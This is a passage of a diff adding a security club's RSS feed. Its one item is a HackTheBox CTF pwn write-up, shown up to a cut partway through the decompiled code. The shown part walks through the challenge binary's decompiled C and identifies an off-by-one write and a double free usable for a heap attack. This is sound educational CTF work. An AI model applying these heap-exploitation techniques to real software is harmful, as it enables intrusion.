@@ -1,0 +1,730 @@
+<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>ESIEA security club</title>
+    <link>http://clubsecuesiea.github.io/</link>
+    <description>Recent content on ESIEA security club</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Beerware shit</copyright>
+    <lastBuildDate>Thu, 19 May 2022 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="http://clubsecuesiea.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all</title>
+        <link>http://clubsecuesiea.github.io/posts/onceandforall/</link>
+        <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>http://clubsecuesiea.github.io/posts/onceandforall/</guid>
+        <description>ESIEA security club http://clubsecuesiea.github.io/posts/onceandforall/ -&lt;p&gt;Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
+Final exploit and tasks can be found &lt;a href=&#34;https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;reverse-engineering&#34;&gt;Reverse engineering&lt;/h1&gt;
+&lt;p&gt;All the snippets of pseudo-code are issued by &lt;a href=&#34;https://hex-rays.com/ida-free/&#34;&gt;IDA freeware&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-4h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
+  {
+    puts(s);
+    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_1310);
+    __isoc99_scanf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_13C8, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v4);
+    puts(s);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ( v4 )
+    {
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+        small_alloc(s);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+        fix(s);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+        examine(s);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+        savebig(s);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+        exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+        puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid choice!&amp;#34;&lt;/span&gt;);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+    }
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary allows you to allocate a small chunk beetween &lt;code&gt;0x1f&lt;/code&gt; and &lt;code&gt;0x38&lt;/code&gt; bytes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;small_alloc&lt;/span&gt;()
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// rbx
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t nmemb; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-20h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-18h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( allocated &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; )
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nothing more!&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;allocated;
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;);
+  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, idx);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEuLL&lt;/span&gt; )
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid!&amp;#34;&lt;/span&gt;);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;How much space do you need for it: &amp;#34;&lt;/span&gt;);
+  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;nmemb);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( nmemb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; nmemb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt; )
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Your inventory cannot provide this type of space!&amp;#34;&lt;/span&gt;);
+  size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nmemb;
+  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
+  (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)calloc(nmemb, &lt;span style=&#34;color:#ae81ff&#34;&gt;1uLL&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] )
+  {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Something didn&amp;#39;t work out...&amp;#34;&lt;/span&gt;);
+    exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+  }
+  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &amp;#34;&lt;/span&gt;);
+  
+  &lt;span style=&#34;color:#75715e&#34;&gt;# off-by-one
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]], nmemb &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.&lt;/p&gt;
+&lt;p&gt;The fix function frees a chunk and asks for another size, then it allocates another chunk with &lt;code&gt;calloc&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fix&lt;/span&gt;()
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// rbx
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; idx; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-28h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t size; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-20h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-18h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;);
+  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;idx);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt; )
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid!&amp;#34;&lt;/span&gt;);
+  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ok, let&amp;#39;s get you some new parts for this one... seems like it&amp;#39;s broken&amp;#34;&lt;/span&gt;);
+  free(alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;How much space do you need for this repair: &amp;#34;&lt;/span&gt;);
+  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt; )
+    &lt;span style=&#34;color:#75715e&#34;&gt;# [1] 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Your inventory cannot provide this type of space.&amp;#34;&lt;/span&gt;);
+  size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;
+  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; idx;
+  alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; calloc(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1uLL&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] )
+  {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Something didn&amp;#39;t work out...&amp;#34;&lt;/span&gt;);
+    exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+  }
+  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &amp;#34;&lt;/span&gt;);
+  read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx], size);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;What would you like to do now?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1. Verify weapon&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2. Continue&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;);
+  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, v4);
+  result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
+  {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( verified )
+    {
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_1648);
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+    {
+      result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts((&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]);
+      verified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    }
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we reach &lt;code&gt;[1]&lt;/code&gt;, &lt;code&gt;alloc_array[2 * idx]&lt;/code&gt; is freed leading to a double free.&lt;/p&gt;
+&lt;p&gt;We can print a chunk only one time:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;examine&lt;/span&gt;()
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-8h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( examined )
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_14D0);
+  examined &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;);
+  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt; )
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts((&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid!&amp;#34;&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally we can malloc a huge chunk, but we cannot wriet anything within:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;savebig&lt;/span&gt;()
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v0; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t size; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-8h] BYREF
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( chungus_weapon &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; qword_202068 )
+  {
+    LODWORD(v0) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_16E8);
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+  {
+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for this massive weapon: &amp;#34;&lt;/span&gt;);
+    __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5AFu&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5C0u&lt;/span&gt; )
+    {
